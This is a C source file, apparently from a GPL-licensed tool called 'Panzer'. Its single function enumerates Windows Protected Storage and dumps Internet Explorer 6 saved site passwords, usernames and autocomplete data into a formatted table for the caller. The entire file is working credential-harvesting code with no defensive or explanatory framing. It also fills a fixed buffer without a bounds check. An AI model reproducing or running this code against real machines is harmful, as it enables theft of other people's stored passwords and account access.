/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */



#include <windows.h>
#include <stdio.h>
#include "Panzer_Definitions.h"




/*
 * Enumerate IE 6
 *
 */

char *dumpIE6Accounts(char *pDataBufferAddress, int *pDataBufferSize)
{
  int lCounter = 0;
  int lCounter1 = 0;
  int lCounter2 = 0;
  int lIndex = 0;
  GUID lTypeGUID;
  char lItemName[MAX_BUF_SIZE + 1];       
  char lItemData[MAX_BUF_SIZE + 1];
  char lItemGUID[MAX_BUF_SIZE + 1];
  char lTemp[MAX_BUF_SIZE + 1];
  IPStorePtr lPStore;
  GUID lSubTypeGUID;
  char lCheckingData[MAX_BUF_SIZE + 1];
  unsigned long lDataLength = 0;
  unsigned char *lDataPointer = NULL;
  _PST_PROMPTINFO *lPSTInfo = NULL;
  IEnumPStoreTypesPtr lEnumPStoreTypes;
  IEnumPStoreItemsPtr lSPEnumItems;
  IEnumPStoreTypesPtr lEnumSubTypes;
  LPWSTR lTempItemName;
  BOOL lDeletedOEAccount = TRUE;
  tPStoreCreateInstance lPStoreCreateInstancePtr;
  HMODULE lDLLHandle = LoadLibrary("pstorec.dll");
  char *lRetVal = pDataBufferAddress!=NULL?pDataBufferAddress:NULL;

  ZeroMemory(lTemp, sizeof(lTemp));
  snprintf(lTemp, sizeof(lTemp) - 1, "%-50s %-20s %-15s %-15s\n\n", "Host/Name", "Type", "Username", "Password");
  lRetVal = addDataToBuffer(lRetVal, pDataBufferSize, lTemp, strlen(lTemp));



  if (lPStoreCreateInstancePtr = (tPStoreCreateInstance) GetProcAddress(lDLLHandle, "PStoreCreateInstance"))
  {    
    lPStoreCreateInstancePtr(&lPStore, 0, 0, 0); 

    if (!FAILED(lPStore->EnumTypes(0, 0, &lEnumPStoreTypes)))
    {
      while(lEnumPStoreTypes->raw_Next(1, &lTypeGUID, 0) == S_OK)
      {      
        wsprintf(lItemGUID, "%x", lTypeGUID);
        lPStore->EnumSubtypes(0, &lTypeGUID, 0, &lEnumSubTypes);
	  
        while(lEnumSubTypes->raw_Next(1, &lSubTypeGUID, 0) == S_OK)
        {
          lPStore->EnumItems(0, &lTypeGUID, &lSubTypeGUID, 0, &lSPEnumItems);


          while(lSPEnumItems->raw_Next(1, &lTempItemName, 0) == S_OK)
          {
            wsprintf(lItemName, "%ws", lTempItemName);			 
            lPStore->ReadItem(0, &lTypeGUID, &lSubTypeGUID, lTempItemName, &lDataLength, &lDataPointer, lPSTInfo, 0);

            if ((unsigned) lstrlen((char *)lDataPointer) < (lDataLength - 1))
            {
              for(lCounter2 = 0, lCounter = 0; (unsigned) lCounter2 < lDataLength; lCounter2 += 2)
              {
                if (lDataPointer[lCounter2] == 0)
                  lItemData[lCounter] = ',';
                else
                  lItemData[lCounter] = lDataPointer[lCounter2];

                lCounter++;
              } // for(lCounter2 =...

              lItemData[lCounter - 1] = 0;				  			
            } else {		  				  
              wsprintf(lItemData, "%s", lDataPointer);				  
            } // if ((unsigned) lstrl...
			  


            /*
             * 5e7e8100 - IE6:Password-Protected sites
             *
             */

            if (lstrcmp(lItemGUID, "5e7e8100") == 0)
            {
              lstrcpy(lCheckingData, "");
              if (strstr(lItemData, ":") != 0)
              {
                lstrcpy(lCheckingData, strstr(lItemData,":") + 1);
                *(strstr(lItemData, ":")) = 0;
              } // if (strstr(lItemDa...

              ZeroMemory(lTemp, sizeof(lTemp));
              _snprintf(lTemp, sizeof(lTemp) - 1, "%-50s %-20s %-15s %-15s\n", lItemName, "PW rotected site", lItemData, lCheckingData);
              lRetVal = addDataToBuffer(lRetVal, pDataBufferSize, lTemp, strlen(lTemp));
            } // if (lstrcmp(lItemGUI...



            /*
             * e161255a IE
             *
             */

            if (lstrcmp(lItemGUID, "e161255a") == 0)
            {
              if (strstr(lItemName, "StringIndex") == 0)
              {
                if (strstr(lItemName, ":String") != 0)
                  *strstr(lItemName, ":String") = 0;

                lstrcpyn(lCheckingData, lItemName, 8);	
                if ((strstr(lCheckingData, "http:/") == 0) && (strstr(lCheckingData, "https:/") == 0))
                {
                  ZeroMemory(lTemp, sizeof(lTemp));
                  _snprintf(lTemp, sizeof(lTemp) - 1, "%-50s %-20s %-15s %-15s\n", lItemName, "Auto complete", lItemData, "");
                  lRetVal = addDataToBuffer(lRetVal, pDataBufferSize, lTemp, strlen(lTemp));
                } else {
                  lstrcpy(lCheckingData, "");
                  if (strstr(lItemData, ",") != 0)
                  {
                    lstrcpy(lCheckingData, strstr(lItemData, ",") + 1);
                    *(strstr(lItemData, ",")) = 0;				  
                  } // if (strstr(lItem...

                  ZeroMemory(lTemp, sizeof(lTemp));
                  snprintf(lTemp, sizeof(lTemp) - 1, "%-50s %-20s %-15s %-15s\n", lItemName, "Auto complete", lItemData, lCheckingData);
                  lRetVal = addDataToBuffer(lRetVal, pDataBufferSize, lTemp, strlen(lTemp));
                } // if ((strstr(lCheckingD...
              } // if (strstr(lItemName, "StringIndex") ...
            } else {
              if (strstr(lItemName, "StringIndex") == 0)
              {
                if (strstr(lItemName, ":String") != 0) 
                  *strstr(lItemName, ":String") = 0;

                lstrcpyn(lCheckingData, lItemName,8);			  
                if ((strstr(lCheckingData, "http:/") == 0) && (strstr(lCheckingData, "https:/") == 0))
                {
                  ZeroMemory(lTemp, sizeof(lTemp));
                  snprintf(lTemp, sizeof(lTemp), "%-50s %-20s %-15s %-15s\n", lItemName, "Auto complete", lItemData, "");
                  lRetVal = addDataToBuffer(lRetVal, pDataBufferSize, lTemp, strlen(lTemp));
                } else {
                  lstrcpy(lCheckingData, "");
                  if (strstr(lItemData, ",") != 0)
                  {
                    lstrcpy(lCheckingData, strstr(lItemData, ",") + 1);
                    *(strstr(lItemData, ","))=0;				  
                  } // if (strstr(lIte...

                  ZeroMemory(lTemp, sizeof(lTemp));
                  snprintf(lTemp, sizeof(lTemp), "%-50s %-20s %-15s %-15s\n", lItemName, "Auto complete", lItemData, lCheckingData);
                  lRetVal = addDataToBuffer(lRetVal, pDataBufferSize, lTemp, strlen(lTemp));
                } // if ((strstr(lChecking...
              } // if (strstr(lItemNa...
            } // if (lstrcmp(lItemGUID, "e161255a...

            ZeroMemory(lItemName, sizeof(lItemName));
            ZeroMemory(lItemData, sizeof(lItemData));	

          } // while(lSPEnumItems->raw_Ne...
        } // while(lEnumSubTypes->raw_Next(1,...
      } // while(lEnumPStoreTypes->raw_...
    } // if (!FAILED(lPStore->EnumTypes(0...
  } // if (lPStoreCreateInstancePtr = (tPSt...

  return(lRetVal);
}
